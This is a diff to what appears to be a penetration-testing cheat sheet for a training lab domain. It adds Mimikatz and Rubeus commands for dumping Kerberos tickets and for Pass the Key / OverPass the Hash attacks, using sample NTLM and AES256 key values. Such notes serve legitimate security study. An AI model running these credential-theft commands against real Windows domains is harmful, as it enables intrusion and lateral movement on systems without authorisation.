@@ -252,6 +252,8 @@ nxc smb 172.16.1.0/24 -u Administrator -d . -H 30B3783CE2ABF1AF70F77D0660CF3453
 
 ### Dumping Tickets
 
+**Note:** Mimikatz requires administrative rights to perform the Pass the Key/OverPass the Hash attacks, while Rubeus doesn't.
+
 ```powershell
 mimikatz.exe
 sekurlsa::tickets /export
@@ -259,4 +261,23 @@ sekurlsa::tickets /export
 
 ```powershell
 Rubeus.exe dump /nowrap
+```
+
+### Pass the Key aka. OverPass the Hash
+
+**Mimikatz**
+
+```powershell
+mimikatz.exe
+# get the key first
+sekurlsa::ekeys
+
+# attack
+sekurlsa::pth /domain:inlanefreight.htb /user:plaintext /ntlm:3f74aa8f08f712f09cd5177b5c1ce50f
+```
+
+**Rubeus**
+
+```powershell
+Rubeus.exe asktgt /domain:inlanefreight.htb /user:plaintext /aes256:b21c99fc068e3ab2ca789bccbef67de43791fd911c6e15ead25641a8fda3fe60 /nowrap
 ```
